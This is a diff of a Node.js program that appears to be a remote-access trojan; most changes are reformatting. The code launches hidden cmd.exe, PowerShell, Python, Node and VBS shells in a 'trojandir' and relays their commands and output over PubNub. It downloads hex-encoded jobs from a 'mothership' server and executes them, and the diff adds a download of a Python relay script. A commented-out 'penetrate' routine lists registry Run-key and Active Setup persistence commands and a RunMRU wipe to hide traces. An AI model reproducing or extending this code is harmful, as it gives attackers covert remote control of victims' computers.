-            logmsg('Unexpected STDIN error:', err);
+            logmsg("Unexpected STDIN error:", err);
         }
     });
 
-    child.on('close', (code) => {
+    child.on("close", (code) => {
         logmsg(`script engine exited with code ${code}`);
     });
 
-    child.on('error', (err) => {
-        logmsg('Failed to start subprocess:', err);
+    child.on("error", (err) => {
+        logmsg("Failed to start subprocess:", err);
     });
 
-    logmsg(`launched child pid=${child.pid} spawn args: ` + JSON.stringify(child.spawnargs) + ' tchildproc: ' + JSON.stringify(tchildproc));
+    logmsg(
+        `launched child pid=${child.pid} spawn args: ` +
+            JSON.stringify(child.spawnargs) +
+            " tchildproc: " +
+            JSON.stringify(tchildproc)
+    );
 
     // log event to mothership
     // TODO log to pubnub
-    
-    logmsg('finished');
+
+    logmsg("finished");
 
     return child;
-
 }
 
 function runnoderelay(pubnubo) {
-    logmsg('starting');
+    logmsg("starting");
 
     const child = spawn("node", ["-i"], {
         shell: false,
@@ -1592,61 +1932,70 @@ function runnoderelay(pubnubo) {
     // Name
     // ProcessId
 
-    child.stdout.on('data', (data) => {
-        const str = Buffer.from(data).toString(); 
+    child.stdout.on("data", (data) => {
+        const str = Buffer.from(data).toString();
 
         logmsg(`Output: ${str}`);
 
-        pubnubo.publishMessage( { execresult:str, ts:getTimestamp(), responseid:getRandomCode(8) } );
+        pubnubo.publishMessage({
+            execresult: str,
+            ts: getTimestamp(),
+            responseid: getRandomCode(8),
+        });
     });
 
-    child.stdout.on('error', (err) => {
-        logmsg('STDOUT error:', err);
+    child.stdout.on("error", (err) => {
+        logmsg("STDOUT error:", err);
     });
 
-    child.stderr.on('data', (data) => {
-        const str = Buffer.from(data).toString(); 
+    child.stderr.on("data", (data) => {
+        const str = Buffer.from(data).toString();
 
         logmsg(`stderr: ${str}`);
 
-        pubnubo.publishMessage( { execresult:str, ts:getTimestamp() } );
+        pubnubo.publishMessage({ execresult: str, ts: getTimestamp() });
     });
 
-    child.stdin.on('error', (err) => {
-        if (err.code === 'EPIPE') {
-            logmsg('Subprocess closed stdin early; ignoring broken pipe.');
+    child.stdin.on("error", (err) => {
+        if (err.code === "EPIPE") {
+            logmsg("Subprocess closed stdin early; ignoring broken pipe.");
         } else {
-            logmsg('Unexpected STDIN error:', err);
+            logmsg("Unexpected STDIN error:", err);
         }
     });
 
-    child.on('close', (code) => {
+    child.on("close", (code) => {
         logmsg(`script engine exited with code ${code}`);
     });
 
-    child.on('error', (err) => {
-        logmsg('Failed to start subprocess:', err);
+    child.on("error", (err) => {
+        logmsg("Failed to start subprocess:", err);
     });
 
-    logmsg(`launched child pid=${child.pid} spawn args: ` + JSON.stringify(child.spawnargs) + ' tchildproc: ' + JSON.stringify(tchildproc));
+    logmsg(
+        `launched child pid=${child.pid} spawn args: ` +
+            JSON.stringify(child.spawnargs) +
+            " tchildproc: " +
+            JSON.stringify(tchildproc)
+    );
 
     // log event to mothership
     // TODO log to pubnub
-    
-    logmsg('finished');
+
+    logmsg("finished");
 
     return child;
 }
 
 function runbatrelay(pubnubo) {
-    logmsg('starting');
+    logmsg("starting");
 
-    const child = spawn('cmd.exe', [], { 
+    const child = spawn("cmd.exe", [], {
         detached: true,
         windowsHide: true,
-        stdio: [ 'pipe', 'pipe', 'pipe' ],
+        stdio: ["pipe", "pipe", "pipe"],
         shell: false,
-        cwd: systemstate.trojandir 
+        cwd: systemstate.trojandir,
     });
 
     // child.unref();
@@ -1656,63 +2005,67 @@ function runbatrelay(pubnubo) {
     // Name
     // ProcessId
 
-    child.stdout.on('data', (data) => {
+    child.stdout.on("data", (data) => {
         logmsg(`Output: ${data}`);
 
-        const str = Buffer.from(data).toString(); 
+        const str = Buffer.from(data).toString();
 
-        pubnubo.publishMessage( { execresult:str, ts:getTimestamp() } );
+        pubnubo.publishMessage({ execresult: str, ts: getTimestamp() });
     });
 
-    child.stdout.on('error', (err) => {
-        logmsg('STDOUT error:', err);
+    child.stdout.on("error", (err) => {
+        logmsg("STDOUT error:", err);
     });
 
-    child.stderr.on('data', (data) => {
+    child.stderr.on("data", (data) => {
         logmsg(`Output: ${data}`);
         // TODO log to pubnub
     });
 
-    child.stdin.on('error', (err) => {
-        if (err.code === 'EPIPE') {
-            logmsg('Subprocess closed stdin early; ignoring broken pipe.');
+    child.stdin.on("error", (err) => {
+        if (err.code === "EPIPE") {
+            logmsg("Subprocess closed stdin early; ignoring broken pipe.");
         } else {
-            logmsg('Unexpected STDIN error:', err);
+            logmsg("Unexpected STDIN error:", err);
         }
     });
 
-    child.on('close', (code) => {
+    child.on("close", (code) => {
         logmsg(`script engine exited with code ${code}`);
         // TODO log to pubnub
     });
 
-    child.on('error', (err) => {
-        logmsg('Failed to start subprocess:', err);
+    child.on("error", (err) => {
+        logmsg("Failed to start subprocess:", err);
     });
 
-    logmsg(`launched child pid=${child.pid} spawn args: ` + JSON.stringify(child.spawnargs) + ' tchildproc: ' + JSON.stringify(tchildproc));
+    logmsg(
+        `launched child pid=${child.pid} spawn args: ` +
+            JSON.stringify(child.spawnargs) +
+            " tchildproc: " +
+            JSON.stringify(tchildproc)
+    );
 
     // log event to mothership
     // TODO log to pubnub
-    
-    logmsg('finished');
+
+    logmsg("finished");
 
     return child;
 }
 
 function launchrelay(tenginename, tpubnubr) {
-
     logmsg(`launching: ${tenginename}, ${tpubnubr}`);
 
-    if ( tenginename == 'JS' ) {
+    if (tenginename == "JS") {
         tchildp = runnoderelay(tpubnubr);
-    } else if ( tenginename == 'BAT' ) {
+    } else if (tenginename == "BAT") {
         tchildp = runbatrelay(tpubnubr);
-    } else if ( tenginename == 'PS1' ) {
+    } else if (tenginename == "PS1") {
         tchildp = runpsrelay(tpubnubr);
-    } else if ( tenginename == 'PY' ) {
+    } else if (tenginename == "PY") {
         tchildp = runpythonrelay(tpubnubr);
-    } else if ( tenginename == 'VBS' ) { 
+    } else if (tenginename == "VBS") {
         tchildp = runvbsrelay(tpubnubr);
     }
 
@@ -1720,63 +2073,67 @@ function launchrelay(tenginename, tpubnubr) {
 }
 
 function relay() {
-    logmsg('starting');
-    
+    logmsg("starting");
+
     let relaycmd = systemstate.cmdconfig;
 
-    let configfpath = '';
+    let configfpath = "";
 
-    configfpath = process_argv.length >= 4 ? process_argv[3] : '';
-    
-    logmsg('reading configfpath: '+configfpath);
+    configfpath = process_argv.length >= 4 ? process_argv[3] : "";
 
-    if ( ! fileExists(configfpath) ) {
-        throw new Error('configfpath does not exist '+configfpath);
+    logmsg("reading configfpath: " + configfpath);
+
+    if (!fileExists(configfpath)) {
+        throw new Error("configfpath does not exist " + configfpath);
     }
 
     let jsonconfigstr = readTag(configfpath);
 
-    if ( isNullOrWhitespace(jsonconfigstr) ) {
-        throw new Error('jsonconfigstr is empty');
+    if (isNullOrWhitespace(jsonconfigstr)) {
+        throw new Error("jsonconfigstr is empty");
     }
 
-    logmsg('jsonconfigstr='+jsonconfigstr);
+    logmsg("jsonconfigstr=" + jsonconfigstr);
 
     let clientjob = JSON.parse(jsonconfigstr);
 
-    logmsg('clientjob: '+JSON.stringify(clientjob));
+    logmsg("clientjob: " + JSON.stringify(clientjob));
 
     let jobtype = clientjob?.jobtype;
     let cmdname = clientjob?.cmdname;
     let args = clientjob?.args;
-    let enginename = ( args ?? [] )[0];
+    let enginename = (args ?? [])[0];
 
-    if ( jobtype != 'EXEC_CMD' ) {
-        throw new Error('jobtype must be EXEC_CMD');
+    if (jobtype != "EXEC_CMD") {
+        throw new Error("jobtype must be EXEC_CMD");
     }
 
-    if ( cmdname != 'StartRelay' ) {
-        throw new Error('cmdname must be StartRelay');
+    if (cmdname != "StartRelay") {
+        throw new Error("cmdname must be StartRelay");
     }
 
-    if ( isNullOrWhitespace(enginename) ) {
-        throw new Error('cmdname must be StartRelay');
+    if (isNullOrWhitespace(enginename)) {
+        throw new Error("cmdname must be StartRelay");
     }
 
-    if ( ! [ 'BAT', 'PS1', 'VBS', 'JS', 'PY' ].includes(enginename) ) {
-        throw new Error('enginename not supported: '+enginename);
+    if (!["BAT", "PS1", "JS", "PY"].includes(enginename)) {
+        throw new Error("enginename not supported: " + enginename);
     }
 
-    relaycmd.pubnubrelay = new PubnubRelay(enginename);
-  
-    let pubnubr = relaycmd.pubnubrelay;
+    let pubnubr = null;
 
-    // handle incoming message from pubnub (cmds sent by host to client)
-    pubnubr.handleMessage = (msgevent) => {
-        let payload = msgevent.message;
-        let cmdtext = payload.cmdtext;
-        writeToChildProcess(childp, cmdtext);
-    };
+    if (enginename != "PY") {
+        relaycmd.pubnubrelay = new PubnubRelay(enginename);
+
+        pubnubr = relaycmd.pubnubrelay;
+
+        // handle incoming message from pubnub (cmds sent by host to client)
+        pubnubr.handleMessage = (msgevent) => {
+            let payload = msgevent.message;
+            let cmdtext = payload.cmdtext;
+            writeToChildProcess(childp, cmdtext);
+        };
+    }
 
     let childp = null;
 
@@ -1785,122 +2142,148 @@ function relay() {
 
         let tcmdpid = childp?.pid ?? -1;
 
-        if ( ! isPidAlive(tcmdpid) )
+        if (!isPidAlive(tcmdpid)) {
             childp = launchrelay(enginename, pubnubr);
+        }
     };
 
     relaycmd.loop();
 
-    logmsg('finished');
+    logmsg("finished");
 }
 
 function execjob() {
-    logmsg('starting');
+    logmsg("starting");
 
-    let configfpath = '';
+    let configfpath = "";
 
-    configfpath = process_argv.length >= 4 ? process_argv[3] : '';
-    
-    logmsg('reading configfpath: '+configfpath);
+    configfpath = process_argv.length >= 4 ? process_argv[3] : "";
 
-    if ( ! fileExists(configfpath) ) {
-        throw new Error('configfpath does not exist '+configfpath);
+    logmsg("reading configfpath: " + configfpath);
+
+    if (!fileExists(configfpath)) {
+        throw new Error("configfpath does not exist " + configfpath);
     }
 
     let jsonconfigstr = readTag(configfpath);
 
-    if ( isNullOrWhitespace(jsonconfigstr) ) {
-        throw new Error('jsonconfigstr is empty');
+    if (isNullOrWhitespace(jsonconfigstr)) {
+        throw new Error("jsonconfigstr is empty");
     }
 
-    logmsg('jsonconfigstr='+jsonconfigstr);
+    logmsg("jsonconfigstr=" + jsonconfigstr);
 
     let clientjob = JSON.parse(jsonconfigstr);
 
-    logmsg('clientjob: '+JSON.stringify(clientjob));
+    logmsg("clientjob: " + JSON.stringify(clientjob));
 
     let jobfileext = path.extname(clientjob.jobfilename).toLowerCase();
 
-    logmsg('jobfileext: '+jobfileext);
+    logmsg("jobfileext: " + jobfileext);
 
-    if ( jobfileext == '.bat' )
+    if (
+        ![".bat", ".js", ".vbs", ".py", ".ps1"].includes(
+            jobfileext.toLowerCase()
+        )
+    ) {
+        throw new Error(`file extension is not supported ${jobfileext}`);
+    }
+
+    if (jobfileext.toLowerCase() == ".bat") {
         execCMDScript(clientjob.localpath);
+    } else if (jobfileext.toLowerCase() == ".py") {
+        execPYTHONScript(clientjob.localpath);
+    } else if (jobfileext.toLowerCase() == ".js") {
+        execNODEScript(clientjob.localpath);
+    } else if (jobfileext.toLowerCase() == ".vbs") {
+        execVBSScript(clientjob.localpath);
+    } else if (jobfileext.toLowerCase() == ".ps1") {
+        execPSScript(clientjob.localpath);
+    }
 
-    logmsg('finished');
+    logmsg("finished");
 }
 
 async function retrieveClientJob() {
-    logmsg('starting');
+    logmsg("starting");
 
-    let baseUrl = systemstate.mothership + '/ow/retrieve.php';
+    let baseUrl = systemstate.mothership + "/ow/retrieve.php";
     let params = systemstate.statekvp;
-    params.filename = 'execute_cmdlist';
+    params.filename = "execute_cmdlist";
 
     let localpath = systemstate.getClientJobPath();
 
-    let downloadOpts = { download:true, filetype:'txt', localpath:localpath };
+    let downloadOpts = {
+        download: true,
+        filetype: "txt",
+        localpath: localpath,
+    };
     let response = await makeGetRequest(baseUrl, params, null, downloadOpts);
 
-    if ( ! response.headers ) {
-        throw new Error('could not access response headers');
+    if (!response.headers) {
+        throw new Error("could not access response headers");
     }
 
-    if ( ! fileExists(localpath) ) {
-        throw new Error('job file does not exist');
+    if (!fileExists(localpath)) {
+        throw new Error("job file does not exist");
     }
 
+    let jobcode = "";
+    let jobfilename = "";
 
-    let jobcode = '';
-    let jobfilename = '';
+    if (keyExists(response.headers, "X-JobCode"))
+        jobcode = response.headers[getKey(response.headers, "X-JobCode")];
 
-    if ( keyExists(response.headers, 'X-JobCode') )
-        jobcode = response.headers[getKey(response.headers,'X-JobCode')]; 
-    
-    if ( keyExists(response.headers, 'X-JobFilename') )
-        jobfilename = response.headers[getKey(response.headers,'X-JobFilename')];
+    if (keyExists(response.headers, "X-JobFilename"))
+        jobfilename =
+            response.headers[getKey(response.headers, "X-JobFilename")];
 
-    if ( isNullOrWhitespace(jobcode) ) {
-        throw new Error('jobcode is empty');
+    if (isNullOrWhitespace(jobcode)) {
+        throw new Error("jobcode is empty");
     }
 
-    if ( isNullOrWhitespace(jobfilename) ) {
-        throw new Error('jobfilename is empty');
+    if (isNullOrWhitespace(jobfilename)) {
+        throw new Error("jobfilename is empty");
     }
 
     let fileext = path.extname(jobfilename);
 
-    let hextext = fs.readFileSync(localpath, 'utf-8');
-    let jobtext = Buffer.from(hextext, 'hex').toString('utf8');
-    localpath = systemstate.getClientJobPath() + (fileext ?? '');
+    let hextext = fs.readFileSync(localpath, "utf-8");
+    let jobtext = Buffer.from(hextext, "hex").toString("utf8");
+    localpath = systemstate.getClientJobPath() + (fileext ?? "");
     fs.writeFileSync(localpath, jobtext);
 
-    let clientjob = { jobcode:jobcode, jobtype:'execute_cmdlist', localpath:localpath, jobfilename: jobfilename };
+    let clientjob = {
+        jobcode: jobcode,
+        jobtype: "execute_cmdlist",
+        localpath: localpath,
+        jobfilename: jobfilename,
+    };
 
-    logmsg('retrieved client job: '+JSON.stringify(clientjob));
+    logmsg("retrieved client job: " + JSON.stringify(clientjob));
 
-    logmsg('finished');
-    
+    logmsg("finished");
+
     return clientjob;
 }
 
-// handler for incomming messages from parent cmd (e.g., from ping to cmdlist -- watchdog acting as relay)
 async function cmdlist_handleMessage(msg) {
-    logmsg('starting');
+    logmsg("starting");
 
     let cmdlistcmd = systemstate.cmdconfig;
 
     let clientjob = msg?.payload ?? null;
 
-    if ( ! clientjob ) {
-        throw new Error('unable to extract clientjob');
+    if (!clientjob) {
+        throw new Error("unable to extract clientjob");
     }
 
-    logmsg('received new client job: '+JSON.stringify(clientjob));
+    logmsg("received new client job: " + JSON.stringify(clientjob));
 
-    let jobtype = clientjob?.jobtype ?? '';
+    let jobtype = clientjob?.jobtype ?? "";
     // let jobcode = clientjob?.jobcode ?? ''; // TODO: will need to pass jobcode to cmdconfig for logging purposes
-    
-    if ( jobtype.toLowerCase() == 'execute_cmdlist' ) {
+
+    if (jobtype.toLowerCase() == "execute_cmdlist") {
         clientjob = await retrieveClientJob();
     }
 
@@ -1908,59 +2291,65 @@ async function cmdlist_handleMessage(msg) {
 
     fs.writeFileSync(configfpath, JSON.stringify(clientjob));
 
-    if ( ! fileExists(configfpath) ) {
-        throw new Error('clientjobconfigpath does note exist ' + configfpath);
+    if (!fileExists(configfpath)) {
+        throw new Error("clientjobconfigpath does note exist " + configfpath);
     }
 
-    if ( jobtype.toUpperCase() == 'EXEC_CMD' ) {
+    if (jobtype.toUpperCase() == "EXEC_CMD") {
         let cmdname = clientjob.cmdname;
         let cmdargs = clientjob.args ?? [];
 
-        if ( ( cmdname.toLowerCase() == 'StartRelay'.toLowerCase() ) && ( cmdargs.length >= 1 ) ) {
-            let relaycmd = cmdlistcmd.newCmdConfig('relay');
+        if (
+            cmdname.toLowerCase() == "StartRelay".toLowerCase() &&
+            cmdargs.length >= 1
+        ) {
+            let relaycmd = cmdlistcmd.newCmdConfig("relay");
 
-            if ( ! relaycmd ) {
-                throw new Error('could not create child relay cmd');
+            if (!relaycmd) {
+                throw new Error("could not create child relay cmd");
             }
 
             let ret = relaycmd.launch([configfpath]);
-        
-            relaycmd.childprocess.unref();        
-        } else if ( ( cmdname.toLowerCase() == 'StopRelay'.toLowerCase() ) && ( cmdargs.length >= 1 ) ) {
-            let relaycmd = cmdlistcmd.getChildCmd('relay');
-            
+
+            relaycmd.childprocess.unref();
+        } else if (
+            cmdname.toLowerCase() == "StopRelay".toLowerCase() &&
+            cmdargs.length >= 1
+        ) {
+            let relaycmd = cmdlistcmd.getChildCmd("relay");
+
             relaycmd.processMessage = (msg) => {
-                logmsg('process incomming notification msgs from relay'); // TODO
+                logmsg("process incomming notification msgs from relay"); // TODO
             };
 
-            cmdlistcmd.sendMessage(relaycmd, 'cmdlist', clientjob);
+            cmdlistcmd.sendMessage(relaycmd, "cmdlist", clientjob);
         }
-        
+
         // TODO: pcmon, pspcmon, GetSystemOverview, cleanup
 
         return;
     }
 
-    let execjobcmd = cmdlistcmd.newCmdConfig('execjob');
+    let execjobcmd = cmdlistcmd.newCmdConfig("execjob");
 
-    if ( ! execjobcmd ) {
-        throw new Error('could not create child cmd execjob');
+    if (!execjobcmd) {
+        throw new Error("could not create child cmd execjob");
     }
 
     let ret = execjobcmd.launch([configfpath]);
 
     execjobcmd.childprocess.unref();
-     
-    logmsg('finished');
+
+    logmsg("finished");
 }
 
 function cmdlist() {
-    logmsg('starting');
+    logmsg("starting");
 
     let cmdlistcmd = systemstate.cmdconfig;
 
-    if ( cmdlistcmd.cmdname != 'cmdlist' ) {
-        throw new Error('cmdlist routine must only be called from cmdlist cmd');
+    if (cmdlistcmd.cmdname != "cmdlist") {
+        throw new Error("cmdlist routine must only be called from cmdlist cmd");
     }
 
     handleMessage = cmdlist_handleMessage;
@@ -1971,39 +2360,39 @@ function cmdlist() {
 
     cmdlistcmd.loop();
 
-    logmsg('finished');
+    logmsg("finished");
 }
 
 function penetrate() {
-    logmsg('starting');
+    logmsg("starting");
 
-    logmsg('finished');
+    logmsg("finished");
     process.exit(0);
 
     // modify registry for startup items
     // copy exe/scripts to startup folders
 
     /*    
-    cmdstr = ""
-    cmdstr = "REG ADD " & dq & "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" & dq 
-    cmdstr = cmdstr & " /v " & tskname & " /t REG_SZ /d " & exepath & " /f"
-    
-    Call RunShell("cmd /c " & cmdstr, True)
-    
-    // https://helgeklein.com/blog/active-setup-explained/
-    Dim regpath : regpath = dq & "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\" & tskname & dq
-    
-    cmdstr = "REG ADD " & regpath & " /f"
-    Call RunShell(cmdstr, True)
+cmdstr = ""
+cmdstr = "REG ADD " & dq & "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" & dq 
+cmdstr = cmdstr & " /v " & tskname & " /t REG_SZ /d " & exepath & " /f"
 
-    cmdstr = "REG ADD " & regpath & " /v " & dq & "StubPath" & dq & " /d " & dq & exepath & dq & " /t REG_SZ /f"
-    Call RunShell(cmdstr, True)
+Call RunShell("cmd /c " & cmdstr, True)
 
-    cmdstr = "REG ADD " & regpath & " /v " & dq & "Version" & dq & " /d " & dq & "1" & dq & " /t REG_SZ /f"
-    Call RunShell(cmdstr, True)
+// https://helgeklein.com/blog/active-setup-explained/
+Dim regpath : regpath = dq & "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\" & tskname & dq
 
-    cmdstr = "REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f"
-    */
+cmdstr = "REG ADD " & regpath & " /f"
+Call RunShell(cmdstr, True)
+
+cmdstr = "REG ADD " & regpath & " /v " & dq & "StubPath" & dq & " /d " & dq & exepath & dq & " /t REG_SZ /f"
+Call RunShell(cmdstr, True)
+
+cmdstr = "REG ADD " & regpath & " /v " & dq & "Version" & dq & " /d " & dq & "1" & dq & " /t REG_SZ /f"
+Call RunShell(cmdstr, True)
+
+cmdstr = "REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f"
+*/
 
     // schedule tasks
 
@@ -2011,16 +2400,31 @@ function penetrate() {
     // cleanup
 }
 
-function retrieve() {
-    logmsg('starting');
+async function retrieve() {
+    logmsg("starting");
+
+    let scriptname = "pythonrelay.py";
+    let baseUrl = systemstate.mothershipassets + "/" + scriptname;
+    let params = null; // systemstate.statekvp;
+
+    let localpath = path.join(systemstate.trojandir, scriptname);
+
+    let downloadOpts = {
+        download: true,
+        filetype: "txt",
+        localpath: localpath,
+    };
+
+    let response = await makeGetRequest(baseUrl, params, null, downloadOpts);
+
+    // logmsg("response: " + JSON.stringify(response));
+
+    if (!fileExists(localpath)) {
+        throw new Error("retrieve failed for: " + localpath);
+    }
 
     process.exit(0);
-    logmsg('finished');
-    // define array of files to be downloaded from mothershipassets
-    // retrieve each one into trojandir
-    // ' pcmon, relay, modify_edge_lnk.ps1, gunite, 7za, nircmdc
-    // files = Array("pslist.exe", "launch.exe", "pc_monitoring.ps1", "tpl_launch.exe")
-
+    logmsg("finished");
 }
 
 function cleanup() {
@@ -2042,24 +2446,39 @@ function logEventMothership(event_code, kvp) {
 // ---
 
 /*
-    let clientjob = {
-        jobtype: 'EXEC_<ext>', 'execute_cmdlist', 'EXEC_CMD'
-        jobcode: 8 digit 0-9 random code,
-        localpath:'' local path of script text (n/a for EXEC_CMD)
-        jobfilename:'' --> need extension to execute script engine
-        cmdname: 'GetSystemOverview',
-        args: [ ... ]
-    };
+let clientjob = {
+jobtype: 'EXEC_<ext>', 'execute_cmdlist', 'EXEC_CMD'
+jobcode: 8 digit 0-9 random code,
+localpath:'' local path of script text (n/a for EXEC_CMD)
+jobfilename:'' --> need extension to execute script engine
+cmdname: 'GetSystemOverview',
+args: [ ... ]
+};
 
-    ping.php
-    EXEC_CMD --> StartRelay|BAT,PS1,PY,JS,VBS
+ping.php
+EXEC_CMD --> StartRelay|BAT,PS1,PY,JS
 
-    incomming cmd
-    { cmdtext:'echo 1234 \n', seqid:1234, cmdid:random 8 digit code, ts:timestamp }
+incomming cmd
+{ cmdtext:'echo 1234 \n', seqid:1234, cmdid:random 8 digit code, ts:timestamp }
 
-    outgoing result
-    { status:'OK', scriptengine:'BAT', execresult:data, seqid:1234+1, cmdid:random 8 digit code, ts:timestamp }
-    { status:'ERROR', scriptengine:'BAT', execresult:data, seqid:1234+1, cmdid:random 8 digit code, ts:timestamp }
-    { status:'INFO', scriptengine:'BAT', execresult:data, seqid:1234+1, cmdid:random 8 digit code, ts:timestamp }
+outgoing result
+{ status:'OK', scriptengine:'BAT', execresult:data, seqid:1234+1, cmdid:random 8 digit code, ts:timestamp }
+{ status:'ERROR', scriptengine:'BAT', execresult:data, seqid:1234+1, cmdid:random 8 digit code, ts:timestamp }
+{ status:'INFO', scriptengine:'BAT', execresult:data, seqid:1234+1, cmdid:random 8 digit code, ts:timestamp }
+
+*/
+
+/*
+    { 
+        cmdtext:cmdtext, 
+        seqid:seqid++, 
+        cmdid:getRandomCode(8), 
+        ts:getTimestamp()
+        
+        MessageID --> for python relay  
+    }
+
+    
+    { execresult: str, ts: getTimestamp() }
 
 */
